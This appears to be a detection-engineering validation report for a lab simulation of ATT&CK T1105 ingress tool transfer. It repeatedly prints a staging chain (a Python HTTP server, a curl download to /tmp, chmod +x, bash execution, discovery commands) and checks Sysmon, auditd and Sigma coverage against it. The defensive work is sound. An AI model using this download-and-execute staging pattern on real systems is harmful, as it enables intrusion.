# Validation Report: Rogue HTTP Server (T1105 – Ingress Tool Transfer)

## Overview

This document validates the outputs generated throughout the Detection Engineering Lifecycle for the Rogue HTTP Server simulation.

The purpose of this phase is to determine whether:

* The simulation generated the expected telemetry.
* The telemetry was sufficient to reconstruct attacker activity.
* The investigation findings were supported by evidence.
* The ATT&CK mappings accurately reflected observed behavior.
* The detection logic successfully identified malicious patterns.
* The Sigma rule was capable of detecting the simulated activity.

Validation serves as the final quality assurance step before the scenario is considered complete and detection content is accepted into the repository.

---

# Validation Scope

The following components were validated:

| Component            | Validation Objective                           |
| -------------------- | ---------------------------------------------- |
| Simulation           | Confirm attack workflow executed as intended   |
| Telemetry Collection | Confirm visibility into all attack stages      |
| Investigation        | Confirm behavioral findings are evidence-based |
| Threat Mapping       | Confirm ATT&CK alignment                       |
| Detection Logic      | Confirm behaviors are detectable               |
| Sigma Rule           | Confirm detection coverage                     |

---

# Scenario Validation

## Expected Attack Sequence

The simulation was designed to produce:

```text
python3 -m http.server 8000
        ↓
curl http://127.0.0.1:8000/updater.sh
        ↓
/tmp/updater.sh created
        ↓
chmod +x /tmp/updater.sh
        ↓
/bin/bash /tmp/updater.sh
        ↓
whoami
id
hostname
```

## Validation Result

| Activity                    | Observed |
| --------------------------- | -------- |
| Python HTTP Server Creation | PASS     |
| Payload Download            | PASS     |
| File Creation               | PASS     |
| Permission Modification     | PASS     |
| Payload Execution           | PASS     |
| Discovery Commands          | PASS     |

### Conclusion

The simulation executed exactly as intended and produced the expected attack workflow.

---

# Telemetry Validation

## Validation Objective

Determine whether available telemetry sources captured the attack chain.

---

## Sysmon Validation

### Expected Visibility

* python3 execution
* curl execution
* chmod execution
* updater.sh execution
* whoami execution
* id execution
* hostname execution
* Parent-child relationships

### Observed Visibility

| Activity        | Captured |
| --------------- | -------- |
| python3         | PASS     |
| curl            | PASS     |
| chmod           | PASS     |
| updater.sh      | PASS     |
| whoami          | PASS     |
| id              | PASS     |
| hostname        | PASS     |
| Process Lineage | PASS     |

### Assessment

Sysmon successfully captured process creation events throughout the attack lifecycle.

### Result

```text
PASS
```

---

## auditd EXECVE Validation

### Expected Visibility

* Full command lines
* Execution timestamps
* Process identifiers
* Parent process identifiers

### Observed Visibility

| Artifact     | Captured |
| ------------ | -------- |
| Command Line | PASS     |
| PID          | PASS     |
| PPID         | PASS     |
| Timestamp    | PASS     |

### Assessment

Auditd provided sufficient command-line visibility to reconstruct the attack sequence.

### Result

```text
PASS
```

---

## auditd File Activity Validation

### Expected Visibility

* Payload creation
* Permission modification

### Observed Visibility

| Activity          | Captured |
| ----------------- | -------- |
| File Creation     | PASS     |
| Permission Change | PASS     |

### Assessment

Directory monitoring successfully identified file staging activity within `/tmp`.

### Result

```text
PASS
```

---

# Session Reconstruction Validation

## Validation Objective

Determine whether collected telemetry supported complete reconstruction of attacker activity.

---

## Reconstructed Chain

```text
bash
    │
    ├── python3 -m http.server 8000
    │
    ├── curl http://127.0.0.1:8000/updater.sh
    │
    ├── chmod +x /tmp/updater.sh
    │
    └── /bin/bash /tmp/updater.sh
             │
             ├── whoami
             ├── id
             └── hostname
```

### Validation Criteria

| Requirement                | Result |
| -------------------------- | ------ |
| Parent Process Identified  | PASS   |
| Child Processes Identified | PASS   |
| File Activity Correlated   | PASS   |
| Timeline Reconstructed     | PASS   |

### Assessment

The telemetry provided sufficient visibility to accurately reconstruct the complete attack session.

### Result

```text
PASS
```

---

# Investigation Validation

## Validation Objective

Determine whether behavioral findings were supported by telemetry.

---

## Finding Validation

### Finding 1

Temporary HTTP Server Creation

Evidence Observed:

```bash
python3 -m http.server 8000
```

Result:

```text
VALIDATED
```

---

### Finding 2

Tool Transfer Activity

Evidence Observed:

```bash
curl http://127.0.0.1:8000/updater.sh
```

Result:

```text
VALIDATED
```

---

### Finding 3

Payload Staging In Temporary Storage

Evidence Observed:

```text
/tmp/updater.sh
```

Result:

```text
VALIDATED
```

---

### Finding 4

Permission Modification Prior To Execution

Evidence Observed:

```bash
chmod +x /tmp/updater.sh
```

Result:

```text
VALIDATED
```

---

### Finding 5

Execution Of Transferred Tool

Evidence Observed:

```bash
/bin/bash /tmp/updater.sh
```

Result:

```text
VALIDATED
```

---

### Finding 6

Post-Execution Discovery

Evidence Observed:

```bash
whoami
id
hostname
```

Result:

```text
VALIDATED
```

---

## Assessment

All behavioral findings identified during the investigation phase were directly supported by observed telemetry.

### Result

```text
PASS
```

---

# Threat Mapping Validation

## Validation Objective

Determine whether ATT&CK mappings accurately represent observed behavior.

---

| ATT&CK Technique | Expected         | Observed        | Result |
| ---------------- | ---------------- | --------------- | ------ |
| T1105            | Tool Transfer    | Tool Transfer   | PASS   |
| T1059.004        | Shell Execution  | Shell Execution | PASS   |
| T1033            | User Discovery   | whoami, id      | PASS   |
| T1082            | System Discovery | hostname        | PASS   |

### Assessment

The ATT&CK mappings accurately describe the observed adversary workflow.

### Result

```text
PASS
```

---

# Detection Logic Validation

## Validation Objective

Determine whether derived behavioral logic successfully identifies the attack.

---

## Logic 1

### Python HTTP Server Creation

Observed:

```bash
python3 -m http.server 8000
```

Result:

```text
TRIGGERED
```

---

## Logic 2

### Download To Temporary Directory

Observed:

```bash
curl ... -o /tmp/updater.sh
```

Result:

```text
TRIGGERED
```

---

## Logic 3

### Permission Modification

Observed:

```bash
chmod +x /tmp/updater.sh
```

Result:

```text
TRIGGERED
```

---

## Logic 4

### Execution From Temporary Directory

Observed:

```bash
/bin/bash /tmp/updater.sh
```

Result:

```text
TRIGGERED
```

---

## Logic 5

### Download → Chmod → Execute Correlation

Observed:

```text
Download
        ↓
Permission Change
        ↓
Execution
```

Result:

```text
TRIGGERED
```

---

## Assessment

Every behavioral condition identified during detection development was observed during simulation.

### Result

```text
PASS
```

---

# Sigma Rule Validation

## Validation Objective

Determine whether the developed Sigma rule detects the simulated activity.

---

## Rule Condition Coverage

| Rule Component           | Observed During Simulation |
| ------------------------ | -------------------------- |
| curl/wget                | YES                        |
| /tmp path                | YES                        |
| chmod +x                 | YES                        |
| bash execution           | YES                        |
| Temporary file execution | YES                        |

### Assessment

The Sigma rule conditions directly matched observed telemetry.

The rule successfully covers:

```text
Tool Transfer
        ↓
Payload Staging
        ↓
Permission Modification
        ↓
Execution
```

### Result

```text
PASS
```

---

# Detection Coverage Assessment

## Covered Behaviors

| Behavior            | Coverage          |
| ------------------- | ----------------- |
| HTTP Staging Server | Covered           |
| Payload Download    | Covered           |
| Payload Staging     | Covered           |
| Permission Change   | Covered           |
| Payload Execution   | Covered           |
| Discovery Activity  | Partially Covered |

---

## Coverage Strength

```text
High
```

The rule successfully detects the primary attack objective of ingress tool transfer and execution.

---

# Limitations Identified

## Limitation 1

Single-host simulation.

The attacker and victim existed on the same VM.

Real intrusions would generate additional network telemetry.

---

## Limitation 2

Simple payload.

The payload executed only discovery commands.

More complex tooling may produce additional telemetry patterns.

---

## Limitation 3

Rule focuses primarily on process behavior.

File integrity monitoring and network detections could further improve coverage.

---

# Validation Outcome

| Phase                  | Status |
| ---------------------- | ------ |
| Simulation             | PASS   |
| Telemetry Collection   | PASS   |
| Session Reconstruction | PASS   |
| Investigation          | PASS   |
| Threat Mapping         | PASS   |
| Detection Logic        | PASS   |
| Sigma Rule             | PASS   |

---

# Conclusion

The Rogue HTTP Server simulation successfully generated a realistic ATT&CK T1105 Ingress Tool Transfer workflow and produced sufficient telemetry to support investigation, threat mapping, detection development, and rule creation.

Validation confirmed that all major attack stages were observable, all behavioral findings were supported by evidence, ATT&CK mappings accurately reflected the observed activity, and the derived detection logic and Sigma rule successfully identified the simulated attack sequence.

The scenario is therefore considered validated and ready for inclusion within the Detection Engineering Repository as a completed detection engineering use case.
